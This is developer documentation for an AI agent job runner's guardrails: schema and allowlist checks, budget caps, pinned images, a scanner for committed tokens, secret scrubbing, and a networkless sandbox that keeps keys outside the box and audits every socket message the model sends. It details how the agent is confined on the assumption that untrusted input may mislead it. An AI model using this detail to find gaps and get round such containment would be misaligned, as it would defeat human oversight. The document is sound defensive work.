# Guardrails

`flax agents check` runs every guardrail below and fails with one line per problem,
naming the file and, where there is one, the field:

```
jobs/hello/job.yml: model: "acme/other" is not listed in models.yml
```

A warning starts with `warning:`, is shown as an annotation in CI, and does
not fail the check.

CI runs `flax agents check` on every pull request and every push to `main`
(`.github/workflows/check.yml`). The runner runs the same checks before a
job starts, so a job never runs from a tree the checks reject. The one
exception is building the runner bundles, which needs esbuild; the bundled
runner checks `dist/manifest.json` instead (see
[Jobs run the committed runner bundle](#jobs-run-the-committed-runner-bundle)).

Each check is one module in `src/check/`, and each has tests in `test/` with a
passing repository and failing cases that assert the exact message. The tests
build throwaway repositories in the system temp directory, never touching the
real `jobs/`. `test/repository.test.ts` runs every check against this
repository itself.

## job.yml matches the schema

- **Rule:** every `job.yml` validates against `schema/job.schema.json`. Unknown
  keys fail at every level. `trigger` has exactly one of `schedule`, `after`,
  `manual: true` or `envs` (a cron per environment); a schedule must be a
  five-field cron GitHub accepts.
  `output` needs exactly the fields for its `kind`. `name` matches
  `^[a-z][a-z0-9-]{1,40}$` and equals the folder name; `owner` is a GitHub
  handle and not the `CHANGE-ME` placeholder. Limits are positive integers
  with `turns` at most 200, `tokens_per_run` at most 2,000,000 and
  `usd_per_month` at most 175; the optional `tool_calls` is at most 1,000
  (200 when not set), `tool_seconds` at most 300 (60 when not set) and
  `collect_tool_calls` at most 1,000 (200 when not set). `tools` and the
  optional `collect_tools` hold tool names, each once. `thinking` is
  one of the levels Pi takes: `off`, `minimal`, `low`,
  `medium`, `high`, `xhigh`, `max`. `thinking` and `limits` are
  required unless `model` is `none`; a job with `model: none` takes
  neither, nor `shell`, and its `tools` and `collect_tools` are empty.
  A `youtube` output names `playlist` (a title or `null`), `docs_repo`
  and `map_path` (a relative `.json` path without `.` or `..`); its
  optional `unlist_replaced` needs `media.parts`, a schedule other than
  the job's, and a live job to be `live`; its optional `docs_source_dir`
  is a plain relative folder, not inside or around `docs_media_dir` and
  not around `map_path`, and its optional `video_noun` is at most 40
  letters, digits, spaces and apostrophes.
  `pr` paths may not be absolute or contain `..`, and a `pr` output names
  `untrusted_input`: `report_only` or `open_pr`. Its optional
  `frontmatter_keys` and `stamp_keys` never name `intent`, `audience`
  or `owner`, and `flax agents check` refuses a key in both. Its optional `review_model`
  has `model` (a models.yml id) and `thinking`, and its optional
  `attribution_check` is a boolean and its optional `notify` a channel name
  without the #.
  The optional `media` has `network` (`tailnet` or `public`),
  `secrets` (environment variable names, each once) and `timeout_minutes`
  (1 to 180), and may have `setup` (from `packages`, `chromium`,
  `notes-cli`, `java`, each once), `sources` (up to five
  notes-co repositories), `cache` (up to three entries of
  `source`, `paths` and `key_files`, each list one to five path globs)
  and `model` (`model`, a models.yml id;
  `usd_per_run`, more than 0 and at most 2; `usd_per_month`, required
  for a job with `model: none` and refused for one that runs a model).
- **Where:** `schema/job.schema.json`, `src/lib/repo.ts`, `src/lib/cron.ts`,
  reported by `src/check/job-schema.ts`.
- **Why:** a job is only as safe as its definition is precise. A typo in a key
  that silently does nothing is worse than an error.
- **Tests:** `test/job-schema.test.ts`, `test/cron.test.ts` (including
  property tests: every in-range expression is accepted, any out-of-range
  value is rejected).

## Job folders hold only the allowed files

- **Rule:** a job folder may contain `job.yml`, `prompt.md`, `output.json`,
  `media.ts`, `collect.ts`, `render.ts`, `publish.ts`, `fixtures/` and
  `SHADOW_RUNS.md`, and nothing else. The first three and `fixtures/` are required,
  `fixtures/` holds `input.json` and `output.json` and, for a job with
  media, may hold `media.json` and `media/`, and symlinks are rejected.
  `prompt.md` is not empty. `output.json` compiles as a strict JSON Schema,
  has `type: object` at the top and does not declare `maintainer_notes`,
  and `fixtures/output.json` validates against it (a fixture may carry
  `maintainer_notes`, which must then match the notes schema and is taken
  off first, as in a run). A job that lists `collect_tools` has a
  `collect.ts`. Only a job with output kind `pr` has a `publish.ts`. A job
  with `model: none` runs no model and no job script: it has no
  `prompt.md`, `output.json`, `collect.ts`, `render.ts` or `publish.ts`,
  and `fixtures/` is optional, with no required entries.
- **Where:** `src/check/folder.ts`, `notesSchemaProblem` in
  `src/lib/maintainer-notes.ts`.
- **Why:** keeping workflows, credentials, Dockerfiles and delivery code out of
  job folders means a job cannot change how it runs or what it can reach. The
  fixtures prove the schema accepts a realistic answer. The runner adds the
  maintainer notes to every job's schema as a top-level property, which
  needs an object there and the key free.
- **Tests:** `test/folder.test.ts`.

## Models, tools, channels and repositories are allowlisted

- **Rule:** `model` is listed in `models.yml` and is not marked `confirmed: false` (a placeholder); when the model has a `thinking` list, the job's `thinking` is on it; each of `tools` and
  `collect_tools` has a directory under `tools/` that passes the tool check
  below; a Slack `channel` is
  listed in the `post` list of `channels.yml`, and for a live job has its
  channel id there; each pull request repository
  is listed in `repos.yml`, and so is a youtube job's `docs_repo`; a youtube
  or pull request job's `notify` channel is in the `post` list, with its
  id for a live job. A pull request output's `review_model` is listed, not a
  placeholder, takes its `thinking`, and is of another family (the first
  word of the name past the provider and `acme-`: `claude`, `glm`,
  `deepseek`) than `model` and every `models` entry, so the second check
  never runs on the writer's own family. A pull request job's
  `auto_merge.paths` each start with a folder inside its `paths`, cover
  none of `.github/`, `dist/`, `jobs/`, `schema/`, `scripts/`, `src/`,
  `test/`, `tests/` and `tools/`, and name no prompt: workflows, the kit,
  jobs, tests, tools and prompts are never merged without review. `model: none` goes with output kind `youtube`, output kind `pr`
  with `media.pr_paths`, or output kind `file`, and nothing else, and
  a youtube job has `model: none`. The allowlist files are validated too:
  `channels.yml` holds a `post` list of the channels jobs may post to (a
  name, and the Slack channel id once a live job posts there), an optional
  `shadow` channel that shadow runs of slack jobs post to (a name and an
  id; without the id `flax agents check` warns that shadow posting is off, and no
  `post` entry may share its name or id), a `read`
  list of the channels tools may read, each by Slack channel id (`C` and 8
  to 12 capitals or digits) and name, with no id or name repeated in
  either list, and a `links` list of URL prefixes a posted message may
  link to (`https://`, a host, and a path ending in a slash); a model's
  `thinking` list holds at least one level Pi takes, each once, and a
  model takes no other key (`via` is gone: every model is reached through
  the model gateway).
- **Where:** `src/check/allowlists.ts`, `src/lib/allowlists.ts`.
- **Why:** these lists decide cost, reach and blast radius. They change
  rarely and only with code owner review, while jobs can be added freely.
  Pi quietly moves a level the model does not take to another one, so a
  level off the list would run at a level nobody chose.
- **Tests:** `test/allowlists.test.ts`.

## Tools are well formed

- **Rule:** each folder under `tools/` holds exactly `tool.yml` and
  `map.ts`, neither a link. `tool.yml` validates against
  `schema/tool.schema.json` (unknown keys fail), its `name` equals the
  folder name, its `description` is 20 to 1000 characters, its
  `result_max_bytes` is at most 131,072, and `upstream.operations` names
  only operations the upstream offers (`UPSTREAM_OPERATIONS`). The argument
  schema compiles as a strict JSON Schema, is an object with
  `additionalProperties: false`, and puts a limit on every value: strings
  a `maxLength` of at most 16,384 (or an `enum` or `const`), numbers a
  `minimum` and `maximum`, arrays a `maxItems` of at most 100, nested
  objects no extra properties; `$ref`, `anyOf`, `oneOf` and the other
  combining keywords are refused. `source` is `trusted` or `untrusted`
  (see [Runs record whether the model saw untrusted text](#runs-record-whether-the-model-saw-untrusted-text)).
  `map.ts` loads and exports a mapping.
- **Where:** `schema/tool.schema.json`, `src/lib/tools.ts`, reported by
  `src/check/tools.ts`; the tools server loads tools the same way
  (`src/tools-server/start.ts`).
- **Why:** the model chooses the arguments, so every value needs a bound
  the tools server can enforce before anything reaches an upstream. The
  description is what the model reads about the tool, so it is ours, never
  an upstream's.
- **Tests:** `test/tools.test.ts`, including a property test on string
  limits.

## after triggers name existing jobs and form no cycle

- **Rule:** `after:` names an existing job, the "runs after" chain has no
  cycles (including a job waiting on itself), and no job is more than three
  steps down a chain.
- **Where:** `src/check/triggers.ts`.
- **Why:** a cycle or a missing target means the job never runs, with no
  error. GitHub also stops delivering `workflow_run` events more than three
  workflows down a chain.
- **Tests:** `test/triggers.test.ts`, including a property test that compares
  cycle detection with a brute-force walk over random graphs.

## Monthly budgets add up to at most $175

- **Rule:** the sum of `limits.usd_per_month` across all jobs is at most 175.
- **Where:** `src/check/budget.ts`.
- **Why:** one shared cap keeps the total spend predictable; adding a job
  that would exceed it forces a conversation about which jobs are worth it.
- **Tests:** `test/budget.test.ts`, including a property test over random
  job sets.

## Generated files are up to date

- **Rule:** each `.github/workflows/job-<name>.yml` and `JOBS.md` equal what
  `flax agents generate` writes, and there is no generated workflow for a job that
  no longer exists. The fix is always `flax agents generate`.
- **Where:** `src/check/generated.ts`, `src/generate/`.
- **Why:** workflows carry the permissions and runner settings. Generating
  them keeps every job on the same locked-down template (no permissions at
  workflow level, `contents: read` and `packages: read` for the job, the
  agents pool, a timeout, one run at a time, the box pinned by `box.yml`, the
  gateway issuer key (never a model provider's key) and the secrets of the job's tools only on the step that runs the job, the writer app's secrets only for a live job with output kind pr, the report and, on its own, `maintainer-notes.json` always kept for 90 days, and 10 more minutes of timeout for a pull request job's second check), and the check stops hand
  edits from drifting. A job gets a tool secret only when one of its tools
  or `collect_tools` reads the upstream that needs it (`UPSTREAM_SECRETS` in
  `src/lib/tools.ts`), so a job without tools gets none. The workflows
  embed `box.yml` and follow each tool's `upstream.server`, so a new pin or
  a tool moved to another upstream shows up as a workflow diff in the same
  pull request.
- **Tests:** `test/generated.test.ts`: output is byte-identical across runs
  and copies of the repository, a hand edit or a missing file fails, stale
  workflows are flagged and removed, each trigger form maps correctly, each
  upstream maps to exactly its secrets, and a tool moving upstream makes
  the workflow stale.

## Jobs run the committed runner bundle

- **Rule:** a generated job workflow sets up Node and runs
  `node dist/run-job.mjs` for both the preflight and the credentialed step:
  no `pnpm install`, no tsx, no package manager at all, except that a job
  whose `media.setup` lists `packages` installs the locked packages
  (`pnpm install --frozen-lockfile`, with no secret) for its `media.ts`
  alone. `dist/` holds
  `run-job.mjs` (the runner, every `tools/<name>/map.ts` and the runtime
  dependencies), `dist/jobs/<name>/media.mjs`, `collect.mjs` and `render.mjs`
  for each job script, and `manifest.json` (the sha256 of each bundle, of every
  repository file they were built from, and of `pnpm-lock.yaml`). Each
  bundle is one ES module that imports only Node's own modules (plus the
  optional peers ws and debug look for inside try/catch, none installed;
  a `media.mjs` may also import `MEDIA_EXTERNALS` from `node_modules`,
  which is only Playwright, and `flax agents check` refuses it unless its job's
  `media.setup` lists `packages`),
  contains no `devDependencies` package, and is the same bytes on every
  machine. Pull requests never change `dist/` (the Check workflow fails
  one that does); after each push to main the Rebuild dist workflow runs
  `flax agents generate --dist` and pushes the rebuilt `dist/` to main.
  `flax agents check` only checks that the bundles build. The bundled runner, which has no esbuild, checks the
  manifest before every run: a source or the lockfile that changed, a
  bundle that is not the one named, or a tool mapping or job script the
  bundles lack stops the run. Job scripts run from their bundle there; from
  source (`flax agents run-job`) they still run through tsx.
- **Where:** `src/bundle/build.ts` (`buildBundles`, `writeBundles`, and
  `bundleCheck`, which only `src/check/cli.ts` runs), `src/bundle/manifest.ts`
  and `src/check/bundle.ts` (the manifest check, in `CHECKS`, active only in
  the bundle), `src/lib/bundled.ts` and `src/lib/paths.ts` (the repository
  root relative to a bundle), `useBundledMappings` in
  `src/tools-server/mapping.ts`, `jobScriptArgs` in `src/run-job/input.ts`,
  the steps in `src/generate/render.ts`, `.gitattributes`,
  `.github/workflows/rebuild-dist.yml` and the dist step in
  `.github/workflows/check.yml`.
- **Why:** the credentialed step used to install every package, dev tools
  included, and run TypeScript through tsx: a large, changing supply chain
  in the one process that holds the issuer key and the tool credentials.
  The bundle is built from the locked dependencies and committed, and the
  manifest check makes a run refuse a bundle that does not match its
  commit, with nothing fetched. Committing it was chosen over a release
  asset downloaded by checksum: that needs a publish step and a pin bump
  after every runner change. The tool
  mappings are in the bundle so the tools server shares one copy of
  `ToolRefusal` with them and imports nothing from the tree. Pull requests
  used to carry their own rebuilt `dist/`, so any two merged in a row
  conflicted there even when their sources did not; now only main carries
  it. The cost is a minute or two after a merge in which a run whose
  bundled sources changed refuses to start, and a job started by hand on a
  branch runs only if the branch commits its own `flax agents generate --dist`
  output for the trial.
- **Tests:** `test/runner-bundle.test.ts`: the same bytes every time and no
  machine path in them, the entry
  hands over every tool mapping first; in a copy of the repository with no
  `node_modules`, the bundled runner passes preflight, stub-runs a job with
  tools and one with `render.ts`, runs a real job (stand-in `lbx`) whose
  bundled `collect.ts` imports an npm package, calls a tool without the
  issuer key and reads the manifest its bundled `media.ts` made, and
  refuses to start after a source changed; the manifest check names each
  kind of drift, and `flax agents check` refuses only bundles that do not build.
  `test/dist-on-main.test.ts`: `flax agents generate` leaves `dist/` alone
  without `--dist`, the Check workflow fails a pull request that changes
  `dist/`, and the Rebuild dist workflow pushes only `dist/` to main, does
  nothing when it is fresh and leaves a moved main to the newer run.
  `test/generated.test.ts`: the
  steps, Node and nothing else.

## Live jobs list enough shadow runs

- **Rule:** a job with `mode: live` has `SHADOW_RUNS.md` listing at least four
  distinct run links of this repository
  (`https://github.com/notes-co/agents/actions/runs/<id>`), whatever
  its schedule. Runs started by hand count the same as scheduled ones, as
  long as each was reviewed.
  `flax agents run-job` runs a live job only when its output kind is `pr`,
  `slack` or `youtube`; a live `file` job has nothing to deliver and is
  refused.
- **Where:** `src/check/live-mode.ts`, `src/run-job/load.ts`. Changing
  `mode` also needs code owner approval through `CODEOWNERS`.
- **Why:** a job should prove itself in shadow before it posts to people or
  opens pull requests.
- **Tests:** `test/live-mode.test.ts`.

## No secret-shaped strings in job folders

- **Rule:** no file in a job folder contains a GitHub token (`ghp_`, `gho_`,
  `ghu_`, `ghs_`, `ghr_`, `github_pat_`), a Slack token (`xoxa-`, `xoxb-`,
  `xoxp-`, `xoxr-`, `xoxs-`), an AWS access key id, a private key header, or
  a random-looking `sk-` or `sk-ant-` API key. The error gives the file and
  line but never repeats the match, so the secret does not also land in CI
  logs.
- **Where:** `src/check/secrets.ts`.
- **Why:** credentials belong in the runner's secret store, never in a prompt
  or fixture. A committed key has to be rotated, so it is caught before merge.
- **Tests:** `test/secrets.test.ts`.

## box.yml pins the box

- **Rule:** `box.yml` validates against `schema/box.schema.json`: `pinned`
  is a boolean, `box_release` a lbx release tag `vX.Y.Z` (no
  leading zeros, nothing before or after), `box_commit` a full
  40-character commit id, `image` the
  `ghcr.io/notes-co/lbx-agent` repository (never the full
  `lbx` image) by `sha256` digest, all required and no other keys
  (a `relay` or `sockets` key is refused: every run gets no network, see
  [Every run has no network](#every-run-has-no-network)). With `pinned: true`, no
  value may be the all-zeros placeholder. With `pinned: false` the check
  only warns, and `flax agents run-job` refuses every run except `--stub`. Each
  job workflow (and the Network refusal check) fetches lbx's tags
  and refuses to run unless the `box_release` tag names `box_commit`.
- **Where:** `schema/box.schema.json`, `src/lib/box.ts`, reported by
  `src/check/box.ts`; the refusal is in `src/run-job/load.ts`; the tag
  check is the "Check the box release tag" step from
  `src/generate/render.ts`.
- **Why:** a digest names exactly one image, so every run of every job uses
  the box that was published and reviewed, never whatever a tag points to
  today. The release names the lbx version a person reviewed and
  merged; the tag check catches a `box_commit` that is not that release.
  The placeholders let the kit merge before the first publish without any
  job running on an unknown box.
- **Tests:** `test/box.test.ts`, `test/box-release.test.ts`,
  `test/run-job.test.ts`.

## The agent image pins exact versions

- **Rule:** `images/agent/Dockerfile` declares `NODE_VERSION`, `PI_VERSION`,
  `PI_PROVIDER_ACME_VERSION` and `PI_MCP_MAILBOX_VERSION` once each, with
  an exact version (`1.2.3`, optionally with a prerelease suffix; no
  `latest`, range, wildcard or leading `v`), and `NODE_SHA256_AMD64` and `NODE_SHA256_ARM64` as sha256
  checksums. Every one of them is used by the build, and every mention of
  `@earendil-works/pi-coding-agent` or `pi-provider-acme` outside a comment
  carries its pin (`@${PI_VERSION}`, `@${PI_PROVIDER_ACME_VERSION}`). The
  build's `for flag in ...; do` check of `pi --help` covers every flag the
  job runner passes to Pi (`piCommand` in `src/run-job/argv.ts`). The
  Acme plugin is installed with `--prefix /opt/pi-extensions`, the
  directory the job runner loads it from, and the Pi plugin
  (`pi-mcp-mailbox`: the model shim and the tools client) is copied to
  `/opt/pi-extensions/pi-mcp-mailbox.mjs` (`PI_MAILBOX_EXTENSION`), the
  path the job runner names with `--extension` for every run.
  `PI_MCP_MAILBOX_VERSION`, the
  plugin's `package.json` version and its `CLIENT_VERSION` agree.
- **Where:** `src/check/agent-image.ts`; the agreement of the three
  versions is checked by `test/agent-image.test.ts`. The build itself checks
  the installed versions, the flags, that both plugins and
  `/opt/pi-extensions` are owned by root, that the Pi plugin is the
  bundle the workflow made (its sha256, passed as `PI_MCP_MAILBOX_SHA256`
  and kept as a label) and that it loads in Node and reports the pinned
  version; the publish workflow runs the image through `lbx --run` before
  printing a pin.
- **Why:** a tag or range installs whatever is newest on the day the image
  is built, so two publishes of the same commit could run different agents.
  An exact version changes only in a reviewed pull request, and a Pi release
  that drops a flag the runner uses fails the build instead of a job.
- **Tests:** `test/agent-image.test.ts`, including property tests over
  exact versions and versions wrapped in a range or tag;
  `test/pi-plugin-bundle.test.ts` (the bundle imports only `node:` modules,
  is the same bytes every time, and loads with no `node_modules` around it
  and talks to the tools server).

## gateway.yml is valid and pins the gateway's CA root

- **Rule:** `gateway.yml` validates against `schema/gateway.schema.json`:
  an `https` `url` with no path, the certificate's `server_name`, the
  LiteLLM `team`, the `ca` file name, and the gateway's key ceilings
  `key_max_usd` and `key_max_minutes`, no other keys (an `enabled` switch
  is refused: every run goes through the gateway). The `ca` file at the
  repository root holds PEM certificates only (a private key or any other
  block is refused), each a CA certificate valid today; the placeholder is
  refused. Every job's run key must fit under the ceilings: its worst case
  at its model at most `key_max_usd`, and the box's timeout plus 10
  minutes at most `key_max_minutes`.
- **Where:** `schema/gateway.schema.json`, `src/lib/gateway.ts`, reported
  by `src/check/gateway.ts`.
- **Why:** the CA root is the only thing the runner trusts for the
  gateway; a wrong file would either break every run or, worse, trust
  more than the gateway. The ceilings mirror the gateway's own
  `upperbound_key_generate_params`, so a job that could never get a key
  fails in review, not on its first run.
- **Tests:** `test/gateway.test.ts`.

## Runs through the gateway hold only their own key

- **Rule:** a real run refuses to start without `LLM_GATEWAY_ISSUER_KEY`.
  The generated workflows pass the issuer key and no model provider's key.
  The runner reads the month's spend from the
  gateway's `/team/info` (the sum over this job's keys of the month, by
  alias) and refuses a run whose worst case would pass the job's
  `usd_per_month` or the team's monthly budget, or the gateway's key
  ceilings. Right before the box starts it issues one key for the run:
  only the run's model, the worst case as its budget, the box's timeout
  plus 10 minutes as its lifetime, `llm_api` routes only, 2 parallel calls
  and 60 a minute. The box gets no key: the forwarder on the run's model socket
  passes on only `POST /v1/messages` (optionally `?beta=true`) and the
  run's model's catalog entry, forces the model, caps `max_tokens` at
  `tokens_per_run`, drops every header the box sends except
  `anthropic-version`, `anthropic-beta` and `accept`, adds the run's key,
  refuses anything else with a 404 without calling the gateway, and
  records every call in `forwarder.json`. When the box ends, on success,
  failure or a thrown error, the runner stops the forwarder, blocks the
  key and reads its spend into the report; a key it could not block marks
  the run incomplete and fails it. Any failure before the box starts
  (unreachable gateway, an untrusted certificate, a refused issuer key, a
  refused key request) fails the run with a message naming the gateway and
  the cause. A model marked `confirmed: false` is always refused.
- **Where:** `src/run-job/gateway.ts` (client, key requests, ledger),
  `src/run-job/forwarder.ts`, `src/run-job/run.ts`, `modelRefusal` in
  `src/lib/gateway.ts`, `src/check/allowlists.ts`.
- **Why:** a key inside a box is a key a misled model can read from its own
  environment. A key made for one run, one model and one
  worst case, blocked when the run ends and expiring soon after anyway,
  limits what a leak can cost; keeping even that key out of the box, behind
  a forwarder that allows one path and one model, limits what the box can
  ask for at all. Real spend makes the monthly limits real.
- **Tests:** `test/run-job-gateway.test.ts` (against a fake gateway over
  TLS with a test CA: the key request, forwarding during the run, blocking
  on every exit path, each failure before the box, the budget refusals,
  the stub and preflight paths), `test/forwarder.test.ts`
  (forwarded and refused calls, streaming, the catalog, size and body
  checks, an unreachable gateway), `test/gateway.test.ts`.

## Every job runs offline (the offline test)

- **Rule:** `pnpm test` runs every job in `jobs/` with `flax agents run-job <name>
--stub`: the full run (checks, run directory, prompt with preamble, input,
  schema, socket directory, lbx configuration, the `lbx --run` command
  line, answer validation, report) with the stub launcher, which writes
  `fixtures/output.json` as the answer. For a job with tools, the stub run
  also loads the job's tools and starts the tools server on the tools
  socket with no upstreams behind it. It
  needs no network, docker, key or tool credential, and must end with an
  accepted answer.
- **Where:** `test/repository.test.ts`; the stub is `StubLauncher` in
  `src/run-job/launcher.ts`.
- **Why:** a job that cannot get through its own run offline would fail on
  the agents pool too, after pulling images and spending time. This catches
  it on every pull request.
- **Tests:** the guardrail is itself a test; `test/run-job.test.ts` and
  `test/run-job-tools.test.ts` cover the stub run in detail.

## Secrets never reach argv or reports

- **Rule:** no secret reaches the box: lbx is never given `--env`, the
  run's gateway key is added by the forwarder outside the box, and Pi gets
  only the placeholder key `held-by-the-runner`. No secret value is in the
  `lbx` command line, in Pi's arguments or in any file the run writes.
  Every report file and the job summary go through a scrubber that knows
  the gateway issuer key (`LLM_GATEWAY_ISSUER_KEY`), the writer app's
  secrets (`AGENTS_WRITER_APP_ID`, `AGENTS_WRITER_PRIVATE_KEY`), the Slack
  posting token (`SLACK_AGENTS_POST_TOKEN`), the YouTube grant
  (`YOUTUBE_CLIENT_ID`, `YOUTUBE_CLIENT_SECRET`, `YOUTUBE_REFRESH_TOKEN`;
  the channel id is public and not scrubbed), every tool credential
  (`TOOL_SECRET_ENV`) and every media secret (`MEDIA_SECRET_ENV`; the
  livetests mailbox address excepted, which is not secret), plus, for a job with tools, the values inside them
  and the installation token made for the run; the run's own gateway key
  and the media stage's key are added as soon as they are issued, and the writer's installation token as
  soon as delivery makes it, like the YouTube access token and the map
  read's reader token. If a value shows up there anyway, it is
  replaced with `[redacted]` and the run fails, asking for the key to be
  rotated. The issuer key, the writer app's secrets, the posting token, the
  YouTube grant, every tool credential and every media secret are removed
  from the environment of lbx, `collect.ts` and `render.ts`, so they reach
  the runner process alone; `media.ts` gets only the media secrets its job
  lists (see
  [media.ts makes media outside the box](#mediats-makes-media-outside-the-box-with-only-its-own-secrets)). A media file kept in the report that holds a
  secret value is left out and counts as a leak.
- **Where:** `src/run-job/argv.ts`, `src/run-job/report.ts`,
  `src/run-job/input.ts`.
- **Why:** `argv` is visible to every process on the host and is written to
  the report artifact, which anyone with read access to the repository can
  download. If a value leaks anyway, each credential's revoke steps are in
  [credentials.md](credentials.md).
- **Tests:** `test/run-job-argv.test.ts` (no `--env`, the placeholder key),
  `test/run-job.test.ts` (no report file contains the issuer key; a leaked
  key is redacted and fails the run), `test/run-job-tools.test.ts` (a tool
  credential and a token made during the run are redacted too),
  `test/tool-secrets.test.ts`.

## Runs are fenced in

- **Rule:** each run gets a fresh run directory under `--scratch`, else
  `RUNNER_TEMP`, else the system temp directory, the first outside the home
  directory (on a GitHub-hosted runner `RUNNER_TEMP` is inside it). Its data
  directory, the only thing mounted into the box, is owned by the runner user, mode 0700, and neither the home directory nor
  inside or above it; it holds only the prompt, the input and the schema
  before the run. The box has no network at all (see the next rule). Files
  the box wrote are read without following
  links, only when they are regular files, and up to a size cap. lbx enforces the same data directory rules; the runner checks
  them first so the failure is clear. Pi gets only the `read`, `grep`,
  `find` and `ls` tools, `bash` for a job with `shell: true`, plus the
  job's own tools by name, and loads
  nothing it finds on its own: no discovered or configured extensions,
  skills, prompt templates or themes, no `AGENTS.md` or `CLAUDE.md`, no
  project-local settings. Its extensions are the Pi plugin
  (`pi-mcp-mailbox`) and the Acme provider, both named by path in a
  root-owned directory the box user cannot change.
- **Where:** `src/run-job/data-dir.ts`, `src/run-job/lbx-files.ts`,
  `src/run-job/untrusted.ts`; Pi's flags in `piCommand`
  (`src/run-job/argv.ts`).
- **Why:** the model reads untrusted input. The box, no network and a
  throwaway data directory limit what a misled model can reach or change,
  and a fixed set of tools and extensions means a run cannot pick up code
  or instructions that were not reviewed here.
- **Tests:** `test/run-job-data-dir.test.ts`, `test/run-job-files.test.ts`,
  `test/run-job-answer.test.ts`, `test/run-job-argv.test.ts`.

## Every run has no network

- **Rule:** every run gives lbx `--no-network` and `--socket-dir <dir>`,
  and no `--net-policy` or `--env`: the box has only a loopback
  interface, and its one way out is the directory lbx mounts read-only at
  `/run/agent`, holding exactly `model.sock` (the model forwarder, see
  [Runs through the gateway hold only their own key](#runs-through-the-gateway-hold-only-their-own-key))
  and, for a job with tools, `tools.sock` (the model's tools server). The
  issuer key and every tool credential are removed from lbx's environment;
  Pi gets `ACME_BASE_URL=http://127.0.0.1:18080`, the plugin's loopback
  shim to `model.sock`, and the placeholder key `held-by-the-runner`. The
  socket directory is new for each run, mode 0700, in `$XDG_RUNTIME_DIR`,
  `/dev/shm` or the run directory, whichever first passes lbx's rules,
  which the runner checks itself before lbx starts: owned by the runner
  user, not group or other writable, not a link, no `,` `"` or newline in
  its path, a socket path short enough for Linux, outside and not above
  the home directory, not overlapping the data, state or configuration
  directory or lbx's vm artifact directory, not containing the user
  runtime directory, and holding only the runner's own sockets. It is
  removed when the run ends on every path: success, failure, a thrown
  error, a failure to start the tools, and on exit or a signal outside the
  box's own run. The tools socket takes one connection per box (the repair
  turn's box gets a new session on the same socket, under the same calls,
  limits and record), reads one
  JSON-RPC message per line (a line over 64 KB ends the session before it
  is buffered whole, replies over 256 KB are replaced with an error, the
  session closes past `3 x tool_calls + 50` messages), passes every
  message through the incoming message checks (`IncomingChecker`) and the
  method gate, and records every message in the report (`socket/in/`,
  `socket/out/`). Before anything is created, a real run asks the lbx on
  `PATH` whether it has `--socket-dir` and `--no-network`, and refuses to
  start if not. `--apparmor-profile` is never passed. `box.yml` and
  `gateway.yml` have no switch that turns any of this off.
- **Where:** `src/run-job/socket-dir.ts`, `lbxSocketProblem` in
  `src/run-job/launcher.ts`, `buildLbxArgv` and `piCommand` in
  `src/run-job/argv.ts`, `src/run-job/run.ts`,
  `src/run-job/forwarder.ts`, `src/tools-server/socket.ts`,
  `src/tools-server/incoming.ts`; box end in
  `images/agent/pi-mcp-mailbox/src/{sockets,socket-client,model-shim,extension}.ts`.
- **Why:** a box with no network cannot reach anything the runner did not
  put a socket in front of, and holds no key. A socket is a live line to a
  runner process, so each one allows only what its server allows, with
  fixed limits and a record of every message; lbx cannot check that, the
  runner does. Asking lbx itself keeps a mispinned `box.yml` from starting
  a run that would fail inside the box.
- **Tests:** `test/run-job-sockets.test.ts` (argv, the socket directory's
  entries, owner and mode, no credential in lbx's environment, a tool call
  over the socket and a model call through the forwarder to a fake
  gateway during the run, the report, cleanup on every exit path, the
  refusal with an older lbx, a stub run), `test/socket-dir.test.ts` (each
  socket directory rule, the choice of base, removal on exit and on each
  signal), `test/tools-socket.test.ts` (framing, the checks, a second
  connection, the next box's session, the size and message limits, the
  plugin's socket client),
  `test/model-shim.test.ts` (the shim's address, the forwarder reached
  through the shim from source and from the bundle, an unreachable
  gateway), `test/box.test.ts` and `test/gateway.test.ts` (a `sockets`,
  `relay` or `enabled` key is refused), `test/run-job-argv.test.ts`,
  `test/pi-plugin-bundle.test.ts`, `test/run-job-gateway.test.ts`.

## Runs start the tools a job lists, and only those

- **Rule:** for a job that lists tools, a real run refuses to start while a
  secret its tools' upstreams need is not set, naming it. It downloads the
  pinned MCP server binaries only when a tool reads Kubernetes or GitHub,
  starts only the upstreams the job's `tools` and `collect_tools` read
  from, once per run, in a work directory in the run directory and outside
  the data directory, then starts the tools server on `tools.sock` before
  the box. Pi gets the job's tool names after
  `read,grep,find,ls` in `--tools`; a tool name must be a valid tool name,
  not one of Pi's own tools, and listed once. Every tool credential is
  removed from the environment lbx and `collect.ts` get, so it reaches the
  runner process alone and never the box. When the box stops, the tools
  server and the upstreams stop (the upstreams' work directory is removed
  and the GitHub token revoked) and `tools.json` and every message over
  the socket go into the report, also when the run fails. A stub run starts
  the tools server with no upstreams, fetching nothing. A job without tools
  gets no `tools.sock` and no tools server.
- **Where:** `src/run-job/tools.ts`, `src/run-job/run.ts`, `piCommand` in
  `src/run-job/argv.ts`, `withoutToolSecrets` in `src/lib/tools.ts`.
- **Why:** each upstream the runner starts holds a credential, so a run
  starts only what its reviewed tool list needs. The box shares nothing
  with the runner but the data directory and the sockets, so the
  credentials stay on the runner side of the tools socket; lbx gets none
  either, so nothing it passes on can carry one.
- **Tests:** `test/run-job-tools.test.ts` (a stub run, a job without tools,
  missing credentials, a run whose box calls a tool over the tools socket
  while lbx runs, credentials absent from lbx, the box and `collect.ts`,
  the work directory outside the data directory and removed, binaries
  fetched only when needed, upstreams that fail to start),
  `test/run-job-argv.test.ts` (Pi's command line with and without tools).

## collect.ts reaches tools only through its own tools server

- **Rule:** in a real run of a job that lists `collect_tools`, the runner
  starts the upstreams of every tool the job names (for the model and for
  `collect.ts`) once, before `collect.ts`, and starts a second tools
  server serving only `collect_tools`, under `limits.collect_tool_calls`
  and `limits.tool_seconds`, on a mailbox in `collect/` of the run
  directory, outside the data directory and never mounted into the box.
  `collect.ts` gets the mailbox's path in `FLAX_AGENTS_COLLECT_MAILBOX`
  and nothing else new: it still runs without the issuer key or any tool
  credential. This mailbox is the only one left: the model's tools are on
  the tools socket. Every call goes through the same checks, caps, scrubbing and
  records as the model's calls; the record and the mailbox files go into
  the report as `collect/tools.json` and `collect/mailbox/`, also when
  `collect.ts` fails, and the server stops when `collect.ts` ends. A stub
  run takes the fixture input and starts no tools server for `collect.ts`.
- **Where:** `src/run-job/run.ts`, `serveTools` and `startRunUpstreams` in
  `src/run-job/tools.ts`, `runJobScript` in `src/run-job/input.ts`; the
  client side is `src/collect/tools.ts`.
- **Why:** deterministic collection is cheaper and better than having the
  model gather everything, but it must not bring back a second, unchecked
  path to the credentials. Going through the tools server keeps one
  allowlist, one scrubber and one audit trail for every read.
